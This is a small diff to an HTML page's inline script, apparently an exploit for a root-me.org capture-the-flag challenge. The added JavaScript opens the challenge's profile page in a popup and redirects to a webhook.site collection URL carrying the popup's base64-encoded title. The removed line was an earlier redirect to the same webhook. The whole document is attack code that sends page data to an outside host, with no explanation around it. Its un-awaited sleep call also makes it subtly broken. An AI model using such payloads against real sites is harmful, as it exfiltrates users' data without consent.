@@ -4,7 +4,13 @@
 </head>
 <body>
 <script>
-window.location = "https://webhook.site/8fe6e4f2-cfe9-46f4-9013-a616cfbf4e35/?data=admin_page"
+function sleep(ms)
+{
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+popup = window.open("http://challenge01.root-me.org:58003/profile", "popupWindow");
+sleep(5000);
+window.location = "https://webhook.site/8fe6e4f2-cfe9-46f4-9013-a616cfbf4e35/?title=" + btoa(popup.document.title);
 </script>
 </body>
 </html>
